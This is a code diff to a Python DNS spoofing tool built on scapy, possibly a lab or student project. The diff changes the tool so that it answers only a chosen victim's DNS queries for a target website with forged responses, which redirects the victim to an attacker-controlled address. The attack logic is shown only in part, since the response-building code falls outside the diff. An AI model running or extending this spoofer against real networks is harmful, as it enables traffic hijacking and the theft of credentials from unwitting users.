@@ -4,11 +4,11 @@ from scapy.layers.inet import IP, UDP
 from logger import log_info, log_warning
 
 class DNSSpoofer:
-    def __init__(self, interface, ip_attacker, ip_victim, ip_to_spoof):
+    def __init__(self, interface, ip_attacker, ip_victim, website_to_spoof):
         self.interface = interface
         self.ip_attacker = ip_attacker
         self.ip_victim = ip_victim
-        self.ip_to_spoof = ip_to_spoof
+        self.website_to_spoof = website_to_spoof
 
     def spoof(self):
         log_info("Starting DNS spoofing")
@@ -21,12 +21,12 @@ class DNSSpoofer:
         log_warning("Stopping DNS spoofing")
 
     def _on_dns_request(self, packet):
-        # Check that we received a DNS query. And check that the query comes from the victim.
+        # Check that we received a DNS query from the victim for the website we want to spoof.
         if (
             packet.haslayer(DNSQR)
             and packet[DNS].qr == 0
             and packet[IP].src == self.ip_victim
-            # TODO: Only do this for packets related to ip_to_spoof
+            and self.website_to_spoof in packet[DNSQR].qname.decode("utf-8")
         ):
             log_info(
                 "Received DNS query for {} from {}".format(
@@ -49,4 +49,4 @@ class DNSSpoofer:
             send(response, verbose=0)
             log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
         else:
-            log_info("Ignoring packet from {}".format(packet[IP].src))
+            log_warning("Ignoring packet for {} from {}".format(packet[DNSQR].qname, packet[IP].src))
